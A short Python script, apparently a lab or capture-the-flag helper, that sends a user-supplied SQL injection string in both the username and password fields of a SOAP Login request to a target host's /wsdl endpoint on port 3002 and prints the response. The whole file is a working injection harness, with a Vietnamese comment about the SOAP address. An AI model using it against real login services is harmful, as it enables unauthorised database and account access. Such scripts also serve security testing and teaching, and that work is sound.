import requests

target = input("# ")
payloadsqli = input("$ ")
url = f"http://{target}:3002/wsdl"  # địa chỉ trong <soap:address location="...">


headers = {
    "Content-Type": "text/xml; charset=utf-8",
    "SOAPAction": '"Login"'
}

payload = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/">
  <soap:Body>
    <LoginRequest xmlns="http://tempuri.org/">
      <username>{payloadsqli}</username>
      <password>{payloadsqli}</password>
    </LoginRequest>
  </soap:Body>
</soap:Envelope>
"""

response = requests.post(url, data=payload, headers=headers)
print(response.text)
